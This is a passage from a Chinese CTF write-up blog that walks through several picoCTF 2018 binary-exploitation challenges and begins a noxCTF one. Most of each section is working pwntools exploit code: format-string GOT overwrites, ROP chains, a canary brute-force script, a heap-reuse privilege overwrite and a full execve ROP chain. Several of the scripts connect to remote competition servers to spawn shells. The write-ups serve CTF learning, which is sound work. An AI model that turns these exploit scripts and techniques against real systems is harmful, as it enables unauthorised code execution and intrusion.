buf[64]; // Set the gid to the effective gid // this prevents /bin/sh from dropping the privileges gid_t gid = getegid(); setresgid(gid, gid, gid); printf(&quot;Would you like to read the flag? (yes/no)\\n&quot;); fgets(buf, sizeof(buf), stdin); if (strstr(buf, &quot;no&quot;) != NULL) { printf(&quot;Okay, Exiting...\\n&quot;); exit(1); } else if (strstr(buf, &quot;yes&quot;) == NULL) { puts(&quot;Received Unknown Input:\\n&quot;); printf(buf); } read_flag(); } 简单的过一遍我们可以得到程序的大致流程，如果输入的字符串内带有”no”就退出程序，如果输入的字符串带有”yes”且没有”no”便进入unknown_input分支并触发了一个格式化字符串漏洞，然后程序继续执行进入read_flag()函数里，先进行一个判断，如果authenticated不为0就能调用flag函数来getflag，而authenticated是在一开始就全局定义为0了，这时我们能想到通过利用前面的格式化字符串来修改authenticated的值 EXP from pwn import* context(os=&#39;linux&#39;,arch=&#39;i386&#39;,log_level=&#39;debug&#39;) #n = process(&#39;./auth&#39;) n = remote(&#39;2018shell2.picoctf.com&#39;,52398) elf = ELF(&#39;./auth&#39;) puts_got = elf.got[&#39;puts&#39;] puts_sym = elf.symbols[&#39;puts&#39;] authenticated_addr = 0x0804A04C payload = fmtstr_payload(11,{authenticated_addr:0xDEADBEEF}) n.sendline(payload) n.interactive() FLAG picoCTF{y0u_4r3_n0w_aUtH3nt1c4t3d_0bec1698} got—shell?➜ got-shell file auth auth: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=5c1f84b034b4906cce036c3748d4b5a5c3eae0d8, not stripped ➜ got-shell checksec auth [*] &#39;/home/Ep3ius/pwn/process/picoCTF2018/got-shell/auth&#39; Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000) 看一波源码 #include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;stdint.h&gt; #include &lt;string.h&gt; #include &lt;sys/types.h&gt; void win() { system(&quot;/bin/sh&quot;); } int main(int argc, char **argv) { setvbuf(stdout, NULL, _IONBF, 0); char buf[256]; unsigned int address; unsigned int value; puts(&quot;I&#39;ll let you write one 4 byte value to memory. Where would you like to write this 4 byte value?&quot;); scanf(&quot;%x&quot;, &amp;address); sprintf(buf, &quot;Okay, now what value would you like to write to 0x%x&quot;, address); puts(buf); scanf(&quot;%x&quot;, &amp;value); sprintf(buf, &quot;Okay, writing 0x%x to 0x%x&quot;, value, address); puts(buf); *(unsigned int *)address = value; puts(&quot;Okay, exiting now...\\n&quot;); exit(1); } 开始还以为自己是不是C没学好，这题怎么可能这么简单输入两个地址就getshell了，结果发现还真的是。程序的逻辑大致为输入一个十六进制的地址，然后再输入一个十六进制的数值，然后把第一次输入的地址的值替换成输入的数值，我们可以很容易想到用win函数的地址去替换puts_got，这样在程序调用puts时就相当调用了win函数来getshell EXP from pwn import* context(os=&#39;linux&#39;,arch=&#39;i386&#39;,log_level=&#39;debug&#39;) #n = process(&#39;./auth&#39;) n = remote(&#39;2018shell2.picoctf.com&#39;,23731) elf = ELF(&#39;./auth&#39;) puts_got = elf.got[&#39;puts&#39;] win_addr = 0x0804854B n.sendline(hex(puts_got)) sleep(0.1) n.sendline(hex(win_addr)) n.interactive() FLAG picoCTF{m4sT3r_0f_tH3_g0t_t4b1e_a8321d81} rop chain➜ ropchain file rop rop: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=86b31b317beb6a0fac1439ef6b2a271e0132537e, not stripped ➜ ropchain checksec rop [*] &#39;/home/Ep3ius/pwn/process/picoCTF2018/ropchain/rop&#39; Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000) 看一下源码 #include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;string.h&gt; #include &lt;unistd.h&gt; #include &lt;sys/types.h&gt; #include &lt;stdbool.h&gt; #define BUFSIZE 16 bool win1 = false; bool win2 = false; void win_function1() { win1 = true; } void win_function2(unsigned int arg_check1) { if (win1 &amp;&amp; arg_check1 == 0xBAAAAAAD) { win2 = true; } else if (win1) { printf(&quot;Wrong Argument. Try Again.\\n&quot;); } else { printf(&quot;Nope. Try a little bit harder.\\n&quot;); } } void flag(unsigned int arg_check2) { char flag[48]; FILE *file; file = fopen(&quot;flag.txt&quot;, &quot;r&quot;); if (file == NULL) { printf(&quot;Flag File is Missing. Problem is Misconfigured, please contact an Admin if you are running this on the shell server.\\n&quot;); exit(0); } fgets(flag, sizeof(flag), file); if (win1 &amp;&amp; win2 &amp;&amp; arg_check2 == 0xDEADBAAD) { printf(&quot;%s&quot;, flag); return; } else if (win1 &amp;&amp; win2) { printf(&quot;Incorrect Argument. Remember, you can call other functions in between each win function!\\n&quot;); } else if (win1 || win2) { printf(&quot;Nice Try! You&#39;re Getting There!\\n&quot;); } else { printf(&quot;You won&#39;t get the flag that easy..\\n&quot;); } } void vuln() { char buf[16]; printf(&quot;Enter your input&gt; &quot;); return gets(buf); } int main(int argc, char **argv){ setvbuf(stdout, NULL, _IONBF, 0); // Set the gid to the effective gid // this prevents /bin/sh from dropping the privileges gid_t gid = getegid(); setresgid(gid, gid, gid); vuln(); } 审计过代码后我们可以得到程序中各个函数的功能和作用，像win_function1函数的作用为将全局变量win1的值赋为1，win_function2函数的作用是在win1非0且传入的参数为0xBAAAAAAD时将全局变量win2的值赋为1，flag函数的作用是当全局变量win1，win2都不为0且传入的参数为0xDEADBAAD时输出flag，这样我们就知道要通过vuln函数里的栈溢出来构造ROP去分别执行这三个函数getflag EXP from pwn import* context(os=&#39;linux&#39;,arch=&#39;i386&#39;,log_level=&#39;debug&#39;) n = process(&#39;./rop&#39;) elf = ELF(&#39;./rop&#39;) func1 = 0x080485CB func2 = 0x080485d8 flag = 0x0804862B pop_ret = 0x080485d6 buf = &#39;a&#39;*0x18 payload = buf + &#39;aaaa&#39; payload += p32(func1)+p32(pop_ret) + p32(0) payload += p32(func2)+p32(pop_ret) + p32(0xBAAAAAAD) payload += p32(flag)+p32(pop_ret) + p32(0xDEADBAAD) n.recvuntil(&#39;&gt;&#39;) n.sendline(payload) n.interactive() FLAG picoCTF{rOp_aInT_5o_h4Rd_R1gHt_6e6efe52} buffer overflow 3➜ bufferoverflow3 file vuln vuln: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=49bf81f7f16a1c26cfbbb0a70bb89246fadc370e, not stripped ➜ bufferoverflow3 checksec vuln [*] &#39;/home/Ep3ius/pwn/process/picoCTF2018/bufferoverflow3/vuln&#39; Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000) 嗯，没开canary，看一波源码 #include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;string.h&gt; #include &lt;unistd.h&gt; #include &lt;sys/types.h&gt; #include &lt;wchar.h&gt; #include &lt;locale.h&gt; #define BUFSIZE 32 #define FLAGSIZE 64 #define CANARY_SIZE 4 void win() { char buf[FLAGSIZE]; FILE *f = fopen(&quot;flag.txt&quot;,&quot;r&quot;); if (f == NULL) { printf(&quot;Flag File is Missing. Problem is Misconfigured, please contact an Admin if you are running this on the shell server.\\n&quot;); exit(0); } fgets(buf,FLAGSIZE,f); puts(buf); fflush(stdout); } char global_canary[CANARY_SIZE]; void read_canary() { FILE *f = fopen(&quot;canary.txt&quot;,&quot;r&quot;); if (f == NULL) { printf(&quot;Canary is Missing. Problem is Misconfigured, please contact an Admin if you are running this on the shell server.\\n&quot;); exit(0); } fread(global_canary,sizeof(char),CANARY_SIZE,f); fclose(f); } void vuln(){ char canary[CANARY_SIZE]; char buf[BUFSIZE]; char length[BUFSIZE]; int count; int x = 0; memcpy(canary,global_canary,CANARY_SIZE); printf(&quot;How Many Bytes will You Write Into the Buffer?\\n&gt; &quot;); while (x&lt;BUFSIZE) { read(0,length+x,1); if (length[x]==&#39;\\n&#39;) break; x++; } sscanf(length,&quot;%d&quot;,&amp;count); printf(&quot;Input&gt; &quot;); read(0,buf,count); if (memcmp(canary,global_canary,CANARY_SIZE)) { printf(&quot;*** Stack Smashing Detected *** : Canary Value Corrupt!\\n&quot;); exit(-1); } printf(&quot;Ok... Now Where&#39;s the Flag?\\n&quot;); fflush(stdout); } int main(int argc, char **argv){ setvbuf(stdout, NULL, _IONBF, 0); // Set the gid to the effective gid // this prevents /bin/sh from dropping the privileges int i; gid_t gid = getegid(); setresgid(gid, gid, gid); read_canary(); vuln(); return 0; } 打开审计后发现它自己实现了一个简易的Canary防护函数，我们针对canary常用的攻击方式中Stack Smashing Protector Leak 攻击可以立马否决，因为错误回显并没有输出avgr[0]这个必要条件。程序中canary的值是从一个内容不变的文本文档中读取的，所以我们可以通过写爆破脚本去把canary的具体内容输出出来。 通过ida我们可以得到canary插入在栈上0x10的位置，输入的首地址位于栈上0x30， char buf; // [esp+28h] [ebp-30h] int canary; // [esp+48h] [ebp-10h] 我们运行程序测试一下 ➜ bufferoverflow3 ./vuln How Many Bytes will You Write Into the Buffer? &gt; 32 Input&gt; aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa Ok... Now Where&#39;s the Flag? ➜ bufferoverflow3 ./vuln How Many Bytes will You Write Into the Buffer? &gt; 33 Input&gt; aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa *** Stack Smashing Detected *** : Canary Value Corrupt! 确认canary插入的位置为0x20 bp.py from pwn import* #canary = &#39;h_?=&#39; canary = &#39;&#39; for i in range(4): for a in range(0xff): n = process(&#39;./vuln&#39;) n.recvuntil(&#39;&gt; &#39;) n.sendline(&#39;36&#39;) n.recvuntil(&#39;Input&gt; &#39;) payload = &#39;a&#39;*0x20+canary+chr(a) #print chr(a) n.send(payload) try: n.recvuntil(&#39;*** Stack Smashing Detected ***&#39;) except: if canary==&#39;&#39;: canary = chr(a) else: canary += chr(a) n.close() break else: n.close() print &#39;canary:&#39;,canary 通过爆破我们得到canary的值为”h_?=”实在是鬼畜，本以为是PICO的我还是太天真了 在知道canary的情况下，剩下的就是简单的栈溢出劫持程序执行流至win函数就能get flag了 EXP from pwn import* context(os=&#39;linux&#39;,arch=&#39;i386&#39;,log_level=&#39;debug&#39;) n = process(&#39;./vuln&#39;) elf = ELF(&#39;./vuln&#39;) canary = &#39;h_?=&#39; win_addr = 0x080486EB payload = &#39;a&#39;*0x20+canary+&#39;a&#39;*(0x10-len(canary)+4)+p32(win_addr) n.recvuntil(&#39;&gt; &#39;) n.sendline(&#39;100&#39;) n.recvuntil(&#39;Input&gt; &#39;) n.sendline(payload) n.interactive() echo back➜ echo back file echoback echoback: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=a0980ead6e67788ea13395e9bdd23f0fe3d0b2c8, not stripped ➜ echo back checksec echoback [*] &#39;/home/Ep3ius/pwn/process/picoCTF2018/echo back/echoback&#39; Arch: i386-32-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x8048000) 开了NX和Canary，审计下源码……然而这题并没有给，那就开ida看一下程序干了些什么 int __cdecl main(int argc, const char **argv, const char **envp) { __gid_t v3; // ST1C_4 setvbuf(_bss_start, 0, 2, 0); v3 = getegid(); setresgid(v3, v3, v3); vuln(); return 0; } 我们在vuln函数里发现存在一个格式化字符串漏洞，由于我太菜了没能想出能只用一次格式化字符串就能getshell的payload，所以就想先把puts_got改成了vuln函数的地址，让这个格式化字符串漏洞能多次触发。 我们审计过程序后能得到的大致思路为先测出偏移，修改puts_got为vuln函数地址使得漏洞能多次触发，然后通过p32(system_got)+fmt_offset来得到system的真实地址，再把system的真实地址写入printf_got，然后在下一轮循环中输入’/bin/sh’后printf(‘/bin/sh’)就相当执行了system(‘/bin/sh’)来getshell ➜ echo back ./echoback input your message: aaaa%7$x aaaa61616161 Thanks for sending the message! EXP from pwn import* context(os=&#39;linux&#39;,arch=&#39;i386&#39;,log_level=&#39;debug&#39;) #n = process(&#39;./echoback&#39;) n = remote(&#39;2018shell2.picoctf.com&#39;,37402) elf = ELF(&#39;./echoback&#39;) printf_got = elf.got[&#39;printf&#39;] puts_got = elf.got[&#39;puts&#39;] system_got = elf.got[&#39;system&#39;] vuln_addr = 0x080485AB payload1 = fmtstr_payload(7,{puts_got:vuln_addr}) n.recvuntil(&#39;message:&#39;) n.sendline(payload1) leak_payload = p32(system_got)+&#39;%7$s&#39; n.send(leak_payload) n.recvuntil(&#39;message:&#39;) system_addr = u32(n.recv()[5:9]) print hex(system_addr) payload = fmtstr_payload(7,{printf_got:system_addr}) n.sendline(payload) n.interactive() are you root?➜ are_you_root file auth auth: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=42ebad5f08a8e9d227f3783cc951f2737547e086, not stripped ➜ are_you_root checksec auth [*] &#39;/home/Ep3ius/pwn/process/picoCTF2018/are_you_root/auth&#39; Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x400000) 源码分析过一遍后,我们锁定了几个存在漏洞可能的分支 输入用的是fgets if(fgets(buf, 512, stdin) == NULL) break; typedef enum auth_level { ANONYMOUS = 1, GUEST = 2, USER = 3, ADMIN = 4, ROOT = 5 } auth_level_t; struct user { char *name; auth_level_t level; }; login分支 else if (!strncmp(buf, &quot;login&quot;, 5)) { if (user != NULL) { puts(&quot;Already logged in. Reset first.&quot;); continue; } arg = strtok(&amp;buf[6], &quot;\\n&quot;); if (arg == NULL) { puts(&quot;Invalid command&quot;); continue; } user = (struct user *)malloc(sizeof(struct user)); if (user == NULL) { puts(&quot;malloc() returned NULL. Out of Memory\\n&quot;); exit(-1); } user-&gt;name = strdup(arg); printf(&quot;Logged in as \\&quot;%s\\&quot;\\n&quot;, arg); } reset分支 else if(!strncmp(buf, &quot;reset&quot;, 5)) { if (user == NULL) { puts(&quot;Not logged in!&quot;); continue; } free(user-&gt;name); user = NULL; puts(&quot;Logged out!&quot;); } 我们先登陆一个name=’a’* 0x10,level=3的账号，下断点看一下堆里面的分布 gdb-peda$ parseheap addr prev size status fd bk 0x603000 0x0 0x410 Used None None 0x603410 0x0 0x20 Used None None 0x603430 0x0 0x20 Used None None gdb-peda$ x/8x 0x603410 0x603410: 0x0000000000000000 0x0000000000000021 0x603420: 0x0000000000603440 &lt;-*name 0x0000000000000003 &lt;-level 0x603430: 0x0000000000000000 0x0000000000000021 0x603440: 0x6161616161616161 &lt;-name 0x6161616161616161 &lt;-name gdb-peda$ 0x603450: 0x0000000000000000 0x0000000000020bb1 0x603460: 0x0000000000000000 0x0000000000000000 0x603470: 0x0000000000000000 0x0000000000000000 0x603480: 0x0000000000000000 0x0000000000000000 然后reset这个账号，再看下堆 gdb-peda$ x/8x 0x603410 0x603410: 0x0000000000000000 0x0000000000000021 0x603420: 0x0000000000603440 &lt;-*name 0x0000000000000003 0x603430: 0x0000000000000000 0x0000000000000021 0x603440: 0x0000000000000000 0x6161616161616161 &lt;- over_name gdb-peda$ 0x603450: 0x0000000000000000 0x0000000000020bb1 0x603460: 0x0000000000000000 0x0000000000000000 0x603470: 0x0000000000000000 0x0000000000000000 0x603480: 0x0000000000000000 0x0000000000000000 发现0x603440里的值已经置为NULL了，但0x603448部分的值却没被清0，又因为我们的name可以输入很长，并且在建立账号时并没有对level置0操作，所以如果我们去构造一个name使其可以覆盖到下一个堆的level位就可以做到下一个账号的level位可以任意修改 我们再建一个账号看看下一个账号的level位和前一个账号的name的相对位置 gdb-peda$ x/8x 0x603410 0x603410: 0x0000000000000000 0x0000000000000021 0x603420: 0x0000000000603440 0x0000000000000000 0x603430: 0x0000000000000000 &lt;-name 0x0000000000000021 0x603440: 0x0000000000603460 0x0000000000000003 &lt;-level 通过计算我们可以很容易得到name的起始位置和下一个账号的level位距离位8，那么我们直接构造’a’* 0x8+p64(5)就能设好下一个账号的level位 EXP from pwn import* context(os=&#39;linux&#39;,arch=&#39;amd64&#39;,log_level=&#39;debug&#39;) n = remote(&#39;2018shell2.picoctf.com&#39;,41208) #n = process(&#39;./auth&#39;) elf = ELF(&#39;./auth&#39;) def reset(): n.recvuntil(&#39;&gt; &#39;) n.sendline(&#39;reset&#39;) def login(name): n.recvuntil(&#39;&gt; &#39;) n.sendline(&#39;login &#39;+name) def getflag(): n.sendline(&#39;get-flag&#39;) payload = &#39;a&#39;*8+p64(5) login(payload) gdb.attach(n) reset() login(&#39;Ep3ius&#39;) getflag() n.interactive() FLAG picoCTF{m3sS1nG_w1tH_tH3_h43p_bc7d345a} can-you-gets-me➜ can-you-gets-me file gets gets: ELF 32-bit LSB executable, Intel 80386, version 1 (GNU/Linux), statically linked, for GNU/Linux 2.6.32, BuildID[sha1]=4141b1e04d2e7f1623a4b8923f0f87779c0827ee, not stripped ➜ can-you-gets-me checksec gets [*] &#39;/home/Ep3ius/pwn/process/picoCTF2018/can-you-gets-me/gets&#39; Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000) #include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;string.h&gt; #include &lt;unistd.h&gt; #include &lt;sys/types.h&gt; #define BUFSIZE 16 void vuln() { char buf[16]; printf(&quot;GIVE ME YOUR NAME!\\n&quot;); return gets(buf); } int main(int argc, char **argv){ setvbuf(stdout, NULL, _IONBF, 0); // Set the gid to the effective gid // this prevents /bin/sh from dropping the privileges gid_t gid = getegid(); setresgid(gid, gid, gid); vuln(); } 看了一波源码，只给了一个gets和printf，一开始我还想说是不是用ret2dl-resolve，后来肝了一天都没肝出，查报错的时候发现没办法找到plt表，就在想这个会不会是静态编译的文件，就用ldd检查了下 ➜ can-you-gets-me ldd gets 不是动态可执行文件 ➜ can-you-gets-me emmmm，居然还真是静态库编译的那么我们试试用ropgadget的ropchain来构造ROP链玄学一键getshell ROPgadget --binary gets --ropchain - Step 5 -- Build the ROP chain #!/usr/bin/env python2 # execve generated by ROPgadget from struct import pack # Padding goes here p = &#39;&#39; p += pack(&#39;&lt;I&#39;, 0x0806f02a) # pop edx ; ret p += pack(&#39;&lt;I&#39;, 0x080ea060) # @ .data p += pack(&#39;&lt;I&#39;, 0x080b81c6) # pop eax ; ret p += &#39;/bin&#39; p += pack(&#39;&lt;I&#39;, 0x080549db) # mov dword ptr [edx], eax ; ret p += pack(&#39;&lt;I&#39;, 0x0806f02a) # pop edx ; ret p += pack(&#39;&lt;I&#39;, 0x080ea064) # @ .data + 4 p += pack(&#39;&lt;I&#39;, 0x080b81c6) # pop eax ; ret p += &#39;//sh&#39; p += pack(&#39;&lt;I&#39;, 0x080549db) # mov dword ptr [edx], eax ; ret p += pack(&#39;&lt;I&#39;, 0x0806f02a) # pop edx ; ret p += pack(&#39;&lt;I&#39;, 0x080ea068) # @ .data + 8 p += pack(&#39;&lt;I&#39;, 0x08049303) # xor eax, eax ; ret p += pack(&#39;&lt;I&#39;, 0x080549db) # mov dword ptr [edx], eax ; ret p += pack(&#39;&lt;I&#39;, 0x080481c9) # pop ebx ; ret p += pack(&#39;&lt;I&#39;, 0x080ea060) # @ .data p += pack(&#39;&lt;I&#39;, 0x080de955) # pop ecx ; ret p += pack(&#39;&lt;I&#39;, 0x080ea068) # @ .data + 8 p += pack(&#39;&lt;I&#39;, 0x0806f02a) # pop edx ; ret p += pack(&#39;&lt;I&#39;, 0x080ea068) # @ .data + 8 p += pack(&#39;&lt;I&#39;, 0x08049303) # xor eax, eax ; ret p += pack(&#39;&lt;I&#39;, 0x0807a86f) # inc eax ; ret p += pack(&#39;&lt;I&#39;, 0x0807a86f) # inc eax ; ret p += pack(&#39;&lt;I&#39;, 0x0807a86f) # inc eax ; ret p += pack(&#39;&lt;I&#39;, 0x0807a86f) # inc eax ; ret p += pack(&#39;&lt;I&#39;, 0x0807a86f) # inc eax ; ret p += pack(&#39;&lt;I&#39;, 0x0807a86f) # inc eax ; ret p += pack(&#39;&lt;I&#39;, 0x0807a86f) # inc eax ; ret p += pack(&#39;&lt;I&#39;, 0x0807a86f) # inc eax ; ret p += pack(&#39;&lt;I&#39;, 0x0807a86f) # inc eax ; ret p += pack(&#39;&lt;I&#39;, 0x0807a86f) # inc eax ; ret p += pack(&#39;&lt;I&#39;, 0x0807a86f) # inc eax ; ret p += pack(&#39;&lt;I&#39;, 0x0806cc25) # int 0x80 ➜ can-you-gets-me 结果确实只要溢出后执行就能getshell了 EXP from pwn import* from struct import pack n = process(&#39;./gets&#39;) # Padding goes here p = &#39;a&#39;*0x18 + &#39;aaaa&#39; # buf p += pack(&#39;&lt;I&#39;, 0x0806f02a) # pop edx ; ret p += pack(&#39;&lt;I&#39;, 0x080ea060) # @ .data p += pack(&#39;&lt;I&#39;, 0x080b81c6) # pop eax ; ret p += &#39;/bin&#39; p += pack(&#39;&lt;I&#39;, 0x080549db) # mov dword ptr [edx], eax ; ret p += pack(&#39;&lt;I&#39;, 0x0806f02a) # pop edx ; ret p += pack(&#39;&lt;I&#39;, 0x080ea064) # @ .data + 4 p += pack(&#39;&lt;I&#39;, 0x080b81c6) # pop eax ; ret p += &#39;//sh&#39; p += pack(&#39;&lt;I&#39;, 0x080549db) # mov dword ptr [edx], eax ; ret p += pack(&#39;&lt;I&#39;, 0x0806f02a) # pop edx ; ret p += pack(&#39;&lt;I&#39;, 0x080ea068) # @ .data + 8 p += pack(&#39;&lt;I&#39;, 0x08049303) # xor eax, eax ; ret p += pack(&#39;&lt;I&#39;, 0x080549db) # mov dword ptr [edx], eax ; ret p += pack(&#39;&lt;I&#39;, 0x080481c9) # pop ebx ; ret p += pack(&#39;&lt;I&#39;, 0x080ea060) # @ .data p += pack(&#39;&lt;I&#39;, 0x080de955) # pop ecx ; ret p += pack(&#39;&lt;I&#39;, 0x080ea068) # @ .data + 8 p += pack(&#39;&lt;I&#39;, 0x0806f02a) # pop edx ; ret p += pack(&#39;&lt;I&#39;, 0x080ea068) # @ .data + 8 p += pack(&#39;&lt;I&#39;, 0x08049303) # xor eax, eax ; ret p += pack(&#39;&lt;I&#39;, 0x0807a86f) # inc eax ; ret p += pack(&#39;&lt;I&#39;, 0x0807a86f) # inc eax ; ret p += pack(&#39;&lt;I&#39;, 0x0807a86f) # inc eax ; ret p += pack(&#39;&lt;I&#39;, 0x0807a86f) # inc eax ; ret p += pack(&#39;&lt;I&#39;, 0x0807a86f) # inc eax ; ret p += pack(&#39;&lt;I&#39;, 0x0807a86f) # inc eax ; ret p += pack(&#39;&lt;I&#39;, 0x0807a86f) # inc eax ; ret p += pack(&#39;&lt;I&#39;, 0x0807a86f) # inc eax ; ret p += pack(&#39;&lt;I&#39;, 0x0807a86f) # inc eax ; ret p += pack(&#39;&lt;I&#39;, 0x0807a86f) # inc eax ; ret p += pack(&#39;&lt;I&#39;, 0x0807a86f) # inc eax ; ret p += pack(&#39;&lt;I&#39;, 0x0806cc25) # int 0x80 n.recvuntil(&#39;NAME!&#39;) n.sendline(p) n.interactive() FLAG picoCTF{rOp_yOuR_wAY_tO_AnTHinG_cfdfc687}","categories":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}],"tags":[],"keywords":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}]},{"title":"nox_CSAW部分pwn题解","slug":"nox-CSAW部分pwn题解","date":"2019-11-05T03:46:18.000Z","updated":"2021-02-22T08:49:52.251Z","comments":true,"path":"2019/11/05/nox-CSAW部分pwn题解/","link":"","permalink":"/2019/11/05/nox-CSAW部分pwn题解/","excerpt":"","text":"暑假的时候遇到了一群一起学习安全的小伙伴，在他们的诱劝下，开始接触国外的CTF比赛，作为最菜的pwn选手就试着先打两场比赛试试水，结果发现国外比赛真有意思哎嘿。 本文首发于安恒网络空间安全讲武堂 NOXCTFPWN—believeMe(378)惯例先走一遍file+checksec检查 ➜ believeMe file believeMe believeMe: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=03d2b6bcc0a0fdbab80a9852cab1d201437e7e30, not stripped ➜ believeMe checksec believeMe [*] &#39;/home/Ep3ius/pwn/process/noxCTF2018/believeMe/believeMe&#39; Arch: i386-32-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x8048000) 再简单的运行下程序看看程序是什么样的结构 ➜ believeMe ./believeMe Someone told me that pwning makes noxāle... But......... how ???? aaaa aaaa% ➜ believeMe 然后ida简单分析下，我们可以很直接的看到在main函数里有一个格式化字符串漏洞 .text:080487CC ; 10: printf(s); .text:080487CC sub esp, 0Ch .text:080487CF lea eax, [ebp+s] .text:080487D2 push eax ; format .text:080487D3 call _printf 这里我本来以为只是简单的利用格式化字符串去修改fflush_got所以我先测出来fmt的偏移量为9 ➜ believeMe ./believeMe Someone told me that pwning makes noxāle... But......... how ???? aaaa%9$x aaaa61616161% ➜ believeMe 然后构造payload=fmtstr_payload(9,{fflush_got:noxflag_addr})想直接getflag，然后实际上没那么简单。调试过后发现fmtstr_payload不全，len(payload)输出检查后发现长度超了，稍微查了下pwntools文档的fmtstr部分，发现它默认是以hhn也就是单字节的形式去构造payload，如果以双字节或四字节的形式要加上write_size参数，这样payload的长度就不会超过40 payload = fmtstr_payload(9,{fflush_got:noxFlag_addr},write_size=&#39;short&#39;) 然而当我们成功修改fflush_got为noxFlag的地址时会进入到一个死循环中，我们看一下noxFlag函数里面不难发现问题 void __noreturn noxFlag() { char i; // [esp+Bh] [ebp-Dh] FILE *stream; // [esp+Ch] [ebp-Ch] stream = fopen(&quot;flag.txt&quot;, &quot;r&quot;); puts(s); fflush(stdout);//这里又调用了fflush函数，由于我们把fflush_got改成了noxFlag地址，这里相当递归调用noxFlag，形成死循环 if ( stream ) { for ( i = fgetc(stream); i != -1; i = fgetc(stream) ) { putchar(i); fflush(stdout); } fflush(stdout); fclose(stream); } else { puts(&quot;Can&#39;t read file \\n&quot;); fflush(stdout); } exit(0); } 当时就卡在这里没绕出去，经过队友提醒能不能改return地址，才发现思路走偏了 我们gdb把断点下在printf调试一下，先查看下堆栈 gdb-peda$ stack 30 0000| 0xffffcf1c --&gt; 0x80487d8 (&lt;main+129&gt;: add esp,0x10) 0004| 0xffffcf20 --&gt; 0xffffcf44 (&quot;aaaa%21$x&quot;) 0008| 0xffffcf24 --&gt; 0x804890c --&gt; 0xa (&#39;\\n&#39;) 0012| 0xffffcf28 --&gt; 0xf7fb45a0 --&gt; 0xfbad2288 0016| 0xffffcf2c --&gt; 0x8f17 0020| 0xffffcf30 --&gt; 0xffffffff 0024| 0xffffcf34 --&gt; 0x2f (&#39;/&#39;) 0028| 0xffffcf38 --&gt; 0xf7e0edc8 --&gt; 0x2b76 (&#39;v+&#39;) 0032| 0xffffcf3c --&gt; 0xffffd024 --&gt; 0xffffd201 (&quot;/home/Ep3ius/pwn/process/noxCTF2018/believeMe/believeMe&quot;) 0036| 0xffffcf40 --&gt; 0x8000 0040| 0xffffcf44 (&quot;aaaa%21$x&quot;) 0044| 0xffffcf48 (&quot;%21$x&quot;) 0048| 0xffffcf4c --&gt; 0xf7000078 0052| 0xffffcf50 --&gt; 0x1 0056| 0xffffcf54 --&gt; 0x0 0060| 0xffffcf58 --&gt; 0xf7e30a50 (&lt;__new_exitfn+16&gt;: add ebx,0x1835b0) 0064| 0xffffcf5c --&gt; 0x804885b (&lt;__libc_csu_init+75&gt;: add edi,0x1) 0068| 0xffffcf60 --&gt; 0x1 0072| 0xffffcf64 --&gt; 0xffffd024 --&gt; 0xffffd201 (&quot;/home/Ep3ius/pwn/process/noxCTF2018/believeMe/believeMe&quot;) 0076| 0xffffcf68 --&gt; 0xffffd02c --&gt; 0xffffd239 (&quot;XDG_SEAT_PATH=/org/freedesktop/DisplayManager/Seat0&quot;) 0080| 0xffffcf6c --&gt; 0xed1acd00 0084| 0xffffcf70 --&gt; 0xf7fb43dc --&gt; 0xf7fb51e0 --&gt; 0x0 0088| 0xffffcf74 --&gt; 0xffffcf90 --&gt; 0x1 0092| 0xffffcf78 --&gt; 0x0 0096| 0xffffcf7c --&gt; 0xf7e1a637 (&lt;__libc_start_main+247&gt;: add esp,0x10) --More--(25/30) 0100| 0xffffcf80 --&gt; 0xf7fb4000 --&gt; 0x1b1db0 0104| 0xffffcf84 --&gt; 0xf7fb4000 --&gt; 0x1b1db0 0108| 0xffffcf88 --&gt; 0x0 0112| 0xffffcf8c --&gt; 0xf7e1a637 (&lt;__libc_start_main+247&gt;: add esp,0x10) 0116| 0xffffcf90 --&gt; 0x1 我们可以看到在偏移112处return地址为0xFFFFCF8C，我们找到了一个与它偏移相近的并且能被泄露出来的地址，因为题目说了(No ASLR) ，所以return的地址是不会变化，我们可以先连上一次得到return地址构造payload来getflag (这里有一个挺坑的地方就是你在本地复现时终端运行得到地址和用pwntools得到的地址可能不一样，这块我还是不懂是什么原理，希望知道的师傅能讲一下学习一波) EXP from pwn import* context(os=&#39;linux&#39;,arch=&#39;i386&#39;)#,log_level=&#39;debug&#39;) #n = process(&#39;./believeMe&#39;) n = remote(&#39;18.223.228.52&#39;,13337) shell_addr = 0x804867b #ret_addr = 0xffffd030 - 0x4 ret_addr = 0xffffdd30 - 0x4 payload = fmtstr_payload(9,{ret_addr:shell_addr},write_size=&#39;short&#39;) n.recvuntil(&#39;But......... how ????&#39;) #n.sendline(&#39;%21$x&#39;) n.sendline(payload) n.interactive() FLAG 